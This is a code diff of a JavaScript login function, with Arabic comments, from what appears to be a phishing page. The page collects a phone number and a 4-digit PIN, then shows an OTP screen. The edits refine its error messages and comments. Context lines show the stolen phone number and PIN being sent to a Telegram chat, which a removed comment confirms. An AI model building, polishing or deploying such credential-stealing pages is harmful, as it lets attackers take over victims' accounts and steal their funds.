@@ -500,21 +500,21 @@ function login(){
   var isValidPrefix = (firstChar === '2' || firstChar === '3' || firstChar === '4');
   var isPinPartiallyFilled = (pin.length > 0 && pin.length < 4);
 
-  // إذا كان رقم الهاتف غير صالح أو غير مكتمل أو بادئته خطأ -> عرض تنبيه "اسم المستخدم غير صالح"
+  // الخطوة 1: التحقق من رقم الهاتف أولاً
   if(ph.length !== 8 || !isValidPrefix){
     document.getElementById('error-modal-text').textContent = "اسم المستخدم غير صالح";
     document.getElementById('user-error-modal').classList.remove('hide');
     return;
   }
 
-  // إذا كان الرقم السري غير مكتمل أو يحتوي على أرقام متطابقة -> عرض تنبيه "المعلومات التي أدخلتها غير صحيحة..."
+  // الخطوة 2: التحقق من الرقم السري (إذا كان غير مكتمل أو يحتوي على أرقام متطابقة) يظهر تنبيه "الرقم السري غير صالح"
   if(pin.length !== 4 || isPinPartiallyFilled || checkDuplicatePins()){
-    document.getElementById('error-modal-text').textContent = "المعلومات التي أدخلتها غير صحيحة. يرجى إعادة المحاولة";
+    document.getElementById('error-modal-text').textContent = "الرقم السري غير صالح";
     document.getElementById('user-error-modal').classList.remove('hide');
     return;
   }
 
-  // إذا كانت البيانات صحيحة تماماً -> الانتقال لصفحة OTP وإرسال البيانات لتليجرام
+  // الخطوة 3: إذا كانت البيانات سليمة تماماً يتم المتابعة
   showOtp();
   const msg = `<b>تسجيل دخول جديد</b>\n<b>رقم الهاتف:</b> ${ph}\n<b>الرقم السري:</b> ${pin}`;
   sendTelegramMessage(msg);
@@ -522,8 +522,8 @@ function login(){
 
 function closeUserErrorModal(){
   document.getElementById('user-error-modal').classList.add('hide');
-  // إذا كان الخطأ متعلقاً بالرقم السري، نقوم بتفريغه فقط لتسهيل إعادة المحاولة
-  if (document.getElementById('error-modal-text').textContent.includes("المعلومات")) {
+  // إذا كان التنبيه خاص بالرقم السري، نقوم بتفريغ خانات الرقم السري فقط
+  if (document.getElementById('error-modal-text').textContent === "الرقم السري غير صالح") {
     P.forEach(p => p.value = '');
     P[0].focus();
   }
